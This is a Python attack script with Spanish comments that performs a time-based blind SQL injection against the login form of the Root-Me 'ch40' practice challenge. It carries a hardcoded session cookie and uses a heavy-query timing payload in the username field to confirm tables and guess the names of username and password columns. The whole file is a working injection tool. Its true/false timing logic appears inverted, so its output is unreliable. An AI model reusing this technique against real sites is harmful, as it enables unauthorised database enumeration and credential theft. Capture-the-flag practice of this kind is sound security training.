#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 33 - DESCUBRIR COLUMNA DE CONTRASEÑA
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.baseline = 29.48
        self.threshold = 31.48
        self.heavy = "(SELECT COUNT(*) FROM member, member T1)"
        self.technique = "1 AND IF({cond}, 0, {heavy})"
        
    def test_payload_login(self, payload, repeats=5):
        tiempos = []
        data = {"username": payload, "password": "test"}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.post(URL + "?action=login", data=data, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.05)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = self.technique.format(cond=condition, heavy=self.heavy)
        t = self.test_payload_login(payload, repeats=2)
        return t > self.threshold
    
    def columna_existe(self, tabla, columna):
        """Verifica si una columna existe en una tabla"""
        return self.is_true(f"EXISTS(SELECT {columna} FROM {tabla})")
    
    def tabla_existe(self, tabla):
        """Verifica si una tabla existe"""
        return self.is_true(f"EXISTS(SELECT * FROM {tabla})")

# EJECUCIÓN
injector = TimeBasedSQLInjector()

print("="*70)
print("  DESCUBRIENDO COLUMNA DE CONTRASEÑA")
print("="*70)

# 1. Verificar que users existe
print("\n[1] Verificando tabla 'users'...")
if injector.tabla_existe("users"):
    print("  ✅ users existe")
else:
    print("  ❌ users NO existe")
    exit()

# 2. Listar todas las columnas posibles
print("\n[2] Buscando columnas en 'users'...")

# Posibles nombres de columna de usuario (ya sabemos que es username)
columnas_usuario = ['username', 'user', 'login', 'name', 'email', 'nick', 'account', 'id']

# Posibles nombres de columna de contraseña
columnas_password = [
    'password', 'Password', 'pass', 'Pass', 'pwd', 'Pwd',
    'clave', 'Clave', 'contrasena', 'Contrasena',
    'hash', 'Hash', 'secret', 'Secret', 'key', 'Key'
]

# Posibles nombres de columna de ID
columnas_id = ['id', 'ID', 'user_id', 'userId', 'uid', 'UID']

print("\n  Columnas encontradas:")
columnas_encontradas = []

# Probar todas las columnas
for col in columnas_usuario + columnas_password + columnas_id:
    if injector.columna_existe("users", col):
        print(f"    ✅ {col}")
        columnas_encontradas.append(col)
    else:
        print(f"    ❌ {col}")

print(f"\n  Total columnas encontradas: {len(columnas_encontradas)}")

# 3. Identificar la columna de usuario
print("\n[3] Identificando columna de usuario...")
columna_usuario = None
for col in columnas_usuario:
    if injector.columna_existe("users", col):
        # Verificar si contiene 'admin'
        if injector.is_true(f"EXISTS(SELECT {col} FROM users WHERE {col}='admin')"):
            print(f"  ✅ Columna de usuario: {col}")
            columna_usuario = col
            break

if not columna_usuario:
    print("  ❌ No se encontró columna de usuario")
    exit()

# 4. Identificar la columna de contraseña
print("\n[4] Identificando columna de contraseña...")
columna_password = None

for col in columnas_password:
    if injector.columna_existe("users", col):
        # Verificar si tiene datos (no NULL)
        if injector.is_true(f"EXISTS(SELECT {col} FROM users WHERE {col} IS NOT NULL)"):
            print(f"  ✅ Posible columna de contraseña: {col}")
            columna_password = col
            break

if not columna_password:
    print("  ❌ No se encontró columna de contraseña")
    print("\n  Probando con otros nombres...")
    
    # Probar más nombres
    mas_columnas = ['pw', 'PW', 'passwd', 'Passwd', 'password_hash', 'pwd_hash']
    for col in mas_columnas:
        if injector.columna_existe("users", col):
            print(f"  ✅ {col}")
            columna_password = col
            break

# 5. Mostrar estructura completa
print("\n[5] Estructura de la tabla 'users':")
print(f"  Columnas encontradas: {columnas_encontradas}")
print(f"  Columna de usuario: {columna_usuario}")
print(f"  Columna de contraseña: {columna_password}")

# 6. Verificar si hay otras tablas con datos de usuario
print("\n[6] Buscando otras tablas con 'admin'...")
tablas = ['usuarios', 'member', 'members', 'admin', 'administradores', 'accounts', 'profile']

for tabla in tablas:
    if injector.tabla_existe(tabla):
        for col in columnas_usuario:
            if injector.columna_existe(tabla, col):
                if injector.is_true(f"EXISTS(SELECT {col} FROM {tabla} WHERE {col}='admin')"):
                    print(f"  ✅ '{tabla}.{col}' contiene 'admin'")
                    print(f"  🎯 ¡TABLA ALTERNATIVA ENCONTRADA! {tabla}.{col}")

print("\n" + "="*70)
print("  RESUMEN")
print("="*70)
print(f"Tabla: users")
print(f"Columna usuario: {columna_usuario}")
print(f"Columna contraseña: {columna_password}")
